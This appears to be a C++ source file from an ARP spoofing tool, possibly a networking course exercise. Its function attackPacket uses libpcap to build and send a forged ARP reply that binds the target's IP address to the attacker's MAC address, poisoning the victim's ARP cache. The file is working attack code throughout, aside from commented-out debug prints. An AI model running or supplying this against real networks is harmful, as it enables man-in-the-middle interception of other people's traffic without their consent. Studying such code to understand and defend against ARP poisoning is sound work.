#include "attackPacket.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

int attackPacket(pcap_t* pcap, STMacIp MACIp, AttackerMacIp AttMacIp, char* senderIp, char* targetIp) {
	//const u_char* SDMac = reinterpret_cast<const u_char*>(&MACIp.mac);
	//printf("sender mac is %02x:%02x:%02x:%02x:%02x:%02x\n", SDMac[0], SDMac[1], SDMac[2], SDMac[3], SDMac[4], SDMac[5]);
	//printf("sender ip is %d.%d.%d.%d\n",ntohl(MACIp.ip << 24)&0xFF,ntohl(MACIp.ip << 16)&0xFF,ntohl(MACIp.ip << 8)&0xFF,ntohl(MACIp.ip)&0xFF);
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(MACIp.mac);
	packet.eth_.smac_ = Mac(AttMacIp.mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(AttMacIp.mac);
	packet.arp_.sip_ = htonl(Ip(targetIp));
	packet.arp_.tmac_ = Mac(MACIp.mac);
	packet.arp_.tip_ = Ip(MACIp.ip);

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}

	return EXIT_SUCCESS;
}